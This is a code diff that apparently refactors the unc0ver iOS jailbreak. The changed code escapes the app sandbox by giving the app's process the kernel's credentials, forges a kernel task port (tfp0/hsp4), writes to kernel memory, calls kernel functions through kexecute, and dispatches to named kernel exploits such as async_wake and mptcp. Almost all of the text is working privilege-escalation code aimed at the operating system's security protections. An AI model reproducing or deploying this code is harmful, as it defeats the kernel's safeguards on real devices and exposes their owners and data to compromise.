@@ -25,7 +25,6 @@
 #include <sys/syscall.h>
 #include <common.h>
 #include <iokit.h>
-#include <QiLin.h>
 #include <NSTask.h>
 #include <MobileGestalt.h>
 #include <netdb.h>
@@ -82,27 +81,6 @@ extern int maxStage;
     stage++; \
     STATUSWITHSTAGE(stage, maxStage); \
 } while (false)
-
-typedef struct {
-    kptr_t trust_chain;
-    kptr_t amficache;
-    kptr_t OSBoolean_True;
-    kptr_t OSBoolean_False;
-    kptr_t osunserializexml;
-    kptr_t smalloc;
-    kptr_t allproc;
-    kptr_t add_x0_x0_0x40_ret;
-    kptr_t rootvnode;
-    kptr_t zone_map_ref;
-    kptr_t vfs_context_current;
-    kptr_t vnode_lookup;
-    kptr_t vnode_put;
-    kptr_t kernproc;
-    kptr_t kernel_task;
-    kptr_t shenanigans;
-    kptr_t lck_mtx_lock;
-    kptr_t lck_mtx_unlock;
-} offsets_t;
 
 typedef struct {
     bool load_tweaks;
@@ -219,13 +197,13 @@ typedef struct {
     uint64_t end;
 } kmap_hdr_t;
 
-uint64_t zm_fix_addr(uint64_t addr, uint64_t zone_map_ref) {
+uint64_t zm_fix_addr(uint64_t addr) {
     static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
     if (zm_hdr.start == 0) {
         // xxx ReadKernel64(0) ?!
         // uint64_t zone_map_ref = find_zone_map_ref();
-        LOG("zone_map_ref: %llx \n", zone_map_ref);
-        uint64_t zone_map = ReadKernel64(zone_map_ref);
+        LOG("zone_map_ref: %llx \n", GETOFFSET(zone_map_ref));
+        uint64_t zone_map = ReadKernel64(GETOFFSET(zone_map_ref));
         LOG("zone_map: %llx \n", zone_map);
         // hdr is at offset 0x10, mutexes at start
         size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
@@ -253,7 +231,7 @@ uint32_t IKOT_NONE = 0;
 
 void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
     // now make the changes to the port object to make it a task port:
-    uint64_t port_kaddr = getAddressOfPort(getpid(), port);
+    uint64_t port_kaddr = get_address_of_port(getpid(), port);
     
     WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
     WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
@@ -332,7 +310,7 @@ void set_all_image_info_size(uint64_t kernel_task_kaddr, uint64_t all_image_info
 // Stek29's code.
 
 kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
-void remap_tfp0_set_hsp4(mach_port_t *port, uint64_t kernel_task, uint64_t zone_map_ref, uint64_t kernel_base, uint64_t kernel_slide) {
+void remap_tfp0_set_hsp4(mach_port_t *port) {
     // huge thanks to Siguza for hsp4 & v0rtex
     // for explainations and being a good rubber duck :p
     
@@ -366,7 +344,7 @@ void remap_tfp0_set_hsp4(mach_port_t *port, uint64_t kernel_task, uint64_t zone_
     uint64_t remapped_task_addr = 0;
     // task is smaller than this but it works so meh
     uint64_t sizeof_task = 0x1000;
-    uint64_t kernel_task_kaddr = ReadKernel64(kernel_task);
+    uint64_t kernel_task_kaddr = ReadKernel64(GETOFFSET(kernel_task));
     _assert(kernel_task_kaddr != 0, message, true);
     LOG("kernel_task_kaddr = "ADDR"", kernel_task_kaddr);
     mach_port_t zm_fake_task_port = MACH_PORT_NULL;
@@ -378,7 +356,7 @@ void remap_tfp0_set_hsp4(mach_port_t *port, uint64_t kernel_task, uint64_t zone_
     }
     // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
     // or traditional \"zone_init: kmem_suballoc failed\"
-    uint64_t zone_map_kptr = zone_map_ref;
+    uint64_t zone_map_kptr = GETOFFSET(zone_map_ref);
     uint64_t zone_map = ReadKernel64(zone_map_kptr);
     // kernel_task->vm_map == kernel_map
     uint64_t kernel_map = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
@@ -393,12 +371,12 @@ void remap_tfp0_set_hsp4(mach_port_t *port, uint64_t kernel_task, uint64_t zone_
     _assert(kernel_task_kaddr != remapped_task_addr, message, true);
     LOG("remapped_task_addr = "ADDR"", remapped_task_addr);
     _assert(mach_vm_wire(mach_host_self(), km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, message, true);
-    uint64_t port_kaddr = getAddressOfPort(getpid(), *port);
+    uint64_t port_kaddr = get_address_of_port(getpid(), *port);
     LOG("port_kaddr = "ADDR"", port_kaddr);
     make_port_fake_task_port(*port, remapped_task_addr);
     _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, message, true);
     // lck_mtx -- arm: 8  arm64: 16
-    uint64_t host_priv_kaddr = getAddressOfPort(getpid(), mach_host_self());
+    uint64_t host_priv_kaddr = get_address_of_port(getpid(), mach_host_self());
     uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     WriteKernel64(realhost_kaddr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + 4 * sizeof(void*), port_kaddr);
     set_all_image_info_addr(kernel_task_kaddr, kernel_base);
@@ -560,19 +538,19 @@ int updateVersionString(const char *newVersionString, mach_port_t tfp0, vm_addre
     }
 }
 
-uint64_t _vfs_context(uint64_t vfs_context_current, uint64_t zone_map_ref) {
+uint64_t _vfs_context() {
     // vfs_context_t vfs_context_current(void)
-    uint64_t vfs_context = kexecute(vfs_context_current, 1, 0, 0, 0, 0, 0, 0);
-    vfs_context = zm_fix_addr(vfs_context, zone_map_ref);
+    uint64_t vfs_context = kexecute(GETOFFSET(vfs_context_current), 1, 0, 0, 0, 0, 0, 0);
+    vfs_context = zm_fix_addr(vfs_context);
     return vfs_context;
 }
 
-int _vnode_lookup(uint64_t vnode_lookup, const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
+int _vnode_lookup(const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
     size_t len = strlen(path) + 1;
     uint64_t vnode = kmem_alloc(sizeof(uint64_t));
     uint64_t ks = kmem_alloc(len);
     kwrite(ks, path, len);
-    int ret = (int)kexecute(vnode_lookup, ks, 0, vnode, vfs_context, 0, 0, 0);
+    int ret = (int)kexecute(GETOFFSET(vnode_lookup), ks, 0, vnode, vfs_context, 0, 0, 0);
     if (ret != 0) {
         return -1;
     }
@@ -582,13 +560,15 @@ int _vnode_lookup(uint64_t vnode_lookup, const char *path, int flags, uint64_t *
     return 0;
 }
 
-int _vnode_put(uint64_t vnode_put, uint64_t vnode){
-    return (int)kexecute(vnode_put, vnode, 0, 0, 0, 0, 0, 0);
+int _vnode_put(uint64_t vnode){
+    return (int)kexecute(GETOFFSET(vnode_put), vnode, 0, 0, 0, 0, 0, 0);
 }
 
-uint64_t getVnodeAtPath(uint64_t vfs_context, const char *path, uint64_t vnode_lookup){
+uint64_t getVnodeAtPath(const char *path) {
+    uint64_t vfs_context = _vfs_context();
+    _assert(ISADDR(vfs_context), message, true);
     uint64_t *vpp = (uint64_t *)malloc(sizeof(uint64_t));
-    int ret = _vnode_lookup(vnode_lookup, path, O_RDONLY, vpp, vfs_context);
+    int ret = _vnode_lookup(path, O_RDONLY, vpp, vfs_context);
     if (ret != 0){
         LOG("unable to get vnode from path for %s\n", path);
         free(vpp);
@@ -618,7 +598,7 @@ int necp_die() {
 #define IKOT_HOST_PRIV 4
 
 void make_host_into_host_priv() {
-    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
+    uint64_t hostport_addr = get_address_of_port(getpid(), mach_host_self());
     uint32_t old = ReadKernel32(hostport_addr);
     LOG("old host type: 0x%08x\n", old);
     if ((old & (IO_ACTIVE | IKOT_HOST_PRIV)) != (IO_ACTIVE | IKOT_HOST_PRIV))
@@ -626,7 +606,7 @@ void make_host_into_host_priv() {
 }
 
 void make_host_priv_into_host() {
-    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
+    uint64_t hostport_addr = get_address_of_port(getpid(), mach_host_self());
     uint32_t old = ReadKernel32(hostport_addr);
     LOG("old host type: 0x%08x\n", old);
     if ((old & (IO_ACTIVE | IKOT_HOST)) != (IO_ACTIVE | IKOT_HOST))
@@ -715,11 +695,9 @@ bool load_prefs(prefs_t *prefs, NSDictionary *defaults) {
     return true;
 }
 
-void exploit(mach_port_t tfp0,
-             uint64_t kernel_base)
+void exploit()
 {
     int rv = 0;
-    offsets_t offsets = { 0 };
     pid_t myPid = getpid();
     uint64_t myProcAddr = 0;
     uint64_t myOriginalCredAddr = 0;
@@ -735,10 +713,6 @@ void exploit(mach_port_t tfp0,
     NSDictionary *userDefaultsDictionary = nil;
     NSString *prefsFile = nil;
     NSString *homeDirectory = NSHomeDirectory();
-
-#define SETOFFSET(offset, val) (offsets.offset = val)
-#define GETOFFSET(offset)      offsets.offset
-#define kernel_slide           (kernel_base - KERNEL_SEARCH_ADDRESS)
 
     UPSTAGE();
     
@@ -865,36 +839,6 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        // Initialize QiLin.
-        
-        LOG("Initializing QiLin...");
-        SETMESSAGE(NSLocalizedString(@"Failed to initialize QiLin.", nil));
-        if (initQiLin(tfp0, kernel_base) != ERR_SUCCESS) {
-            LOG("QiLin failed to initialize... trying anyway");
-            setMachine();
-        }
-        const char *kernproc_name = "_kernproc";
-        uint64_t kernproc_symbol = findKernelSymbol((char *)kernproc_name);
-        if (ISADDR(kernproc_symbol)) {
-            SETOFFSET(kernproc, kernproc_symbol);
-        } else {
-            setKernelSymbol((char *)kernproc_name, GETOFFSET(kernproc) - kernel_slide);
-        }
-        _assert(ISADDR(findKernelSymbol((char *)kernproc_name)), message, true);
-        const char *rootvnode_name = "_rootvnode";
-        uint64_t rootvnode_symbol = findKernelSymbol((char *)rootvnode_name);
-        if (ISADDR(rootvnode_symbol)) {
-            SETOFFSET(rootvnode, rootvnode_symbol);
-        } else {
-            setKernelSymbol((char *)rootvnode_name, GETOFFSET(rootvnode) - kernel_slide);
-        }
-        _assert(ISADDR(findKernelSymbol((char *)rootvnode_name)), message, true);
-        LOG("Successfully initialized QiLin.");
-    }
-    
-    UPSTAGE();
-    
-    {
         if (prefs.export_kernel_task_port) {
             // Export kernel task port.
             LOG("Exporting kernel task port...");
@@ -918,22 +862,22 @@ void exploit(mach_port_t tfp0,
         
         LOG("Escaping Sandbox...");
         SETMESSAGE(NSLocalizedString(@"Failed to escape sandbox.", nil));
-        myProcAddr = getProcStructForPid(myPid);
+        myProcAddr = get_proc_struct_for_pid(myPid);
         LOG("myProcAddr = "ADDR"", myProcAddr);
         _assert(ISADDR(myProcAddr), message, true);
-        kernelCredAddr = getKernelCredAddr();
+        kernelCredAddr = get_kernel_cred_addr();
         LOG("kernelCredAddr = "ADDR"", kernelCredAddr);
         _assert(ISADDR(kernelCredAddr), message, true);
         Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
         LOG("Shenanigans = "ADDR"", Shenanigans);
         _assert(ISADDR(Shenanigans), message, true);
         WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
-        myOriginalCredAddr = ShaiHuludProcessAtAddr(myProcAddr, kernelCredAddr);
+        myOriginalCredAddr = give_creds_to_process_at_addr(myProcAddr, kernelCredAddr);
         LOG("myOriginalCredAddr = "ADDR"", myOriginalCredAddr);
         _assert(ISADDR(myOriginalCredAddr), message, true);
         _assert(setuid(0) == ERR_SUCCESS, message, true);
         _assert(getuid() == 0, message, true);
-        _assert(platformizeProcAtAddr(myProcAddr) == ERR_SUCCESS, message, true);
+        set_platform_binary(myProcAddr);
         LOG("Successfully escaped Sandbox.");
     }
     
@@ -1017,17 +961,14 @@ void exploit(mach_port_t tfp0,
             
             LOG("Initializing kexecute...");
             SETMESSAGE(NSLocalizedString(@"Failed to initialize kexecute.", nil));
-            init_kexecute(GETOFFSET(add_x0_x0_0x40_ret));
+            init_kexecute();
             LOG("Successfully initialized kexecute.");
             
             // Clear dev vnode's si_flags.
             
             LOG("Clearing dev vnode's si_flags...");
             SETMESSAGE(NSLocalizedString(@"Failed to clear dev vnode's si_flags.", nil));
-            uint64_t vfs_context = _vfs_context(GETOFFSET(vfs_context_current), GETOFFSET(zone_map_ref));
-            LOG("vfs_context = "ADDR"", vfs_context);
-            _assert(ISADDR(vfs_context), message, true);
-            uint64_t devVnode = getVnodeAtPath(vfs_context, thedisk, GETOFFSET(vnode_lookup));
+            uint64_t devVnode = getVnodeAtPath(thedisk);
             LOG("devVnode = "ADDR"", devVnode);
             _assert(ISADDR(devVnode), message, true);
             uint64_t v_specinfo = ReadKernel64(devVnode + koffset(KSTRUCT_OFFSET_VNODE_VU_SPECINFO));
@@ -1037,7 +978,7 @@ void exploit(mach_port_t tfp0,
             uint32_t si_flags = ReadKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS));
             LOG("si_flags = 0x%x", si_flags);
             _assert(si_flags == 0, message, true);
-            _assert(_vnode_put(GETOFFSET(vnode_put), devVnode) == ERR_SUCCESS, message, true);
+            _assert(_vnode_put(devVnode) == ERR_SUCCESS, message, true);
             LOG("Successfully cleared dev vnode's si_flags.");
             
             // Deinitialize kexecute.
@@ -1352,7 +1293,7 @@ void exploit(mach_port_t tfp0,
         
         LOG("Setting HSP4...");
         SETMESSAGE(NSLocalizedString(@"Failed to set HSP4.", nil));
-        remap_tfp0_set_hsp4(&tfp0, GETOFFSET(kernel_task), GETOFFSET(zone_map_ref), kernel_base, kernel_slide);
+        remap_tfp0_set_hsp4(&tfp0);
         LOG("Successfully set HSP4.");
     }
     
@@ -1801,22 +1742,6 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        // Drop kernel credentials.
-        
-        LOG("Dropping kernel credentials...");
-        SETMESSAGE(NSLocalizedString(@"Failed to clean up.", nil));
-        ShaiHuludProcessAtAddr(myProcAddr, myOriginalCredAddr);
-        WriteKernel64(GETOFFSET(shenanigans), Shenanigans);
-        if (prefs.load_tweaks) {
-            setuidProcessAtAddr(0, myProcAddr);
-            ShaiHulud2ProcessAtAddr(myProcAddr);
-        }
-        LOG("Successfully dropped kernel credentials.");
-    }
-    
-    UPSTAGE();
-    
-    {
         if (prefs.load_tweaks) {
             // Load Tweaks.
             
@@ -1856,16 +1781,16 @@ void exploit(mach_port_t tfp0,
             exploit_success = true;
         } else {
             switch ([[NSUserDefaults standardUserDefaults] integerForKey:K_EXPLOIT]) {
-                case empty_list: {
+                case empty_list_exploit: {
                     exploit_success = vfs_sploit();
                     break;
                 }
                     
-                case multi_path: {
+                case multi_path_exploit: {
                     exploit_success = mptcp_go();
                     break;
                 }
-                case async_wake: {
+                case async_wake_exploit: {
                     exploit_success = async_wake_go();
                     break;
                 }
@@ -1890,7 +1815,7 @@ void exploit(mach_port_t tfp0,
             NSInteger support = recommendedRestartSupport();
             _assert(support != -1, message, true);
             switch (support) {
-                case necp: {
+                case necp_exploit: {
                     necp_die();
                     break;
                 }
@@ -1902,13 +1827,16 @@ void exploit(mach_port_t tfp0,
             NOTICE(NSLocalizedString(@"Kernel exploit failed. This is not an error. Reboot and try again.", nil), true, false);
             exit(EXIT_FAILURE);
         }
-        uint64_t kernel_base = (uint64_t)get_kernel_base(tfp0);
+        kernel_base = (uint64_t)get_kernel_base(tfp0);
         LOG("kernel_base = "ADDR"", kernel_base);
         _assert(ISADDR(kernel_base), message, true);
         uint32_t kernel_magic = ReadKernel32(kernel_base);
         LOG("kernel_magic = 0x%x", kernel_magic);
         _assert(kernel_magic == MACH_HEADER_MAGIC, message, true);
-        exploit(tfp0, kernel_base);
+        kernel_slide = (kernel_base - KERNEL_SEARCH_ADDRESS);
+        LOG("kernel_slide = "ADDR"", kernel_slide);
+        _assert(ISADDR(kernel_slide), message, true);
+        exploit();
         STATUS(NSLocalizedString(@"Jailbroken", nil), false, false);
     });
 }
@@ -1932,7 +1860,7 @@ void exploit(mach_port_t tfp0,
     // Do any additional setup after loading the view, typically from a nib.
     sharedController = self;
     bundledResources = bundledResourcesVersion();
-    LOG("Unc0ver Version: %@", appVersion());
+    LOG("unc0ver Version: %@", appVersion());
     LOG("Bundled Resources Version: %@", bundledResources);
     if (jailbreakEnabled()) {
         STATUS(NSLocalizedString(@"Re-Jailbreak", nil), true, true);
